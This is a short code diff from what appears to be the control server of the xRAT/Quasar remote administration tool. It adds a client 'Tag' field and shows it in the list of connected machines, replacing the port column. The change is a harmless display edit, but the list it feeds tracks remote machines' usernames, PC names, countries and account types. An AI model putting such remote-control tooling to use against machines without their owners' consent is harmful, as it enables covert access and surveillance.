@@ -28,6 +28,7 @@ namespace xServer.Core.Commands
                 client.Value.Id = packet.Id;
                 client.Value.Username = packet.Username;
                 client.Value.PCName = packet.PCName;
+                client.Value.Tag = packet.Tag;
 
                 string userAtPc = string.Format("{0}@{1}", client.Value.Username, client.Value.PCName);
 
@@ -42,7 +43,7 @@ namespace xServer.Core.Commands
                 // this " " leaves some space between the flag-icon and first item
                 ListViewItem lvi = new ListViewItem(new string[]
                 {
-                    " " + client.EndPoint.Address.ToString(), client.EndPoint.Port.ToString(),
+                    " " + client.EndPoint.Address, client.Value.Tag,
                     userAtPc, client.Value.Version, "Connected", "Active", country,
                     client.Value.OperatingSystem, client.Value.AccountType
                 }) { Tag = client, ImageIndex = packet.ImageIndex };
